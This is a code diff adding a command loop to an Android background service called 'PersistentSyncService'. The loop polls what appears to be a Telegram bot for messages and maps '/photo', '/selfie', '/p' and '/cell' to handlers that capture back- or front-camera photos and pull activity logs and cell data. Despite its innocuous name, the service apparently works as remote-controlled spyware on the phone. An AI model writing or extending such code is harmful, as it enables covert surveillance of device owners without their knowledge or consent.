@@ -88,7 +88,27 @@ class PersistentSyncService : LifecycleService() {
 
                     // ... (existing code)
                     if (json.getBoolean("ok")) {
-                        // ... (existing code)
+                        val updates = json.getJSONArray("result")
+                        var maxUpdateId = lastUpdateId
+                        for (i in 0 until updates.length()) {
+                            val update = updates.getJSONObject(i)
+                            val currentUpdateId = update.getLong("update_id")
+                            if (currentUpdateId > maxUpdateId) {
+                                maxUpdateId = currentUpdateId
+                            }
+                            if (update.has("message")) {
+                                val message = update.getJSONObject("message")
+                                if (message.has("text")) {
+                                    val text = message.getString("text")
+                                    when (text) {
+                                        "/photo" -> handlePhotoCommand(CameraUtility.LensFacing.BACK, "📷 *Back Camera Photo*")
+                                        "/selfie" -> handlePhotoCommand(CameraUtility.LensFacing.FRONT, "🤳 *Front Camera Photo*")
+                                        "/p" -> handleActivityLogCommand()
+                                        "/cell" -> handleCellCommand()
+                                    }
+                                }
+                            }
+                        }
                         lastUpdateId = maxUpdateId
                     }
 
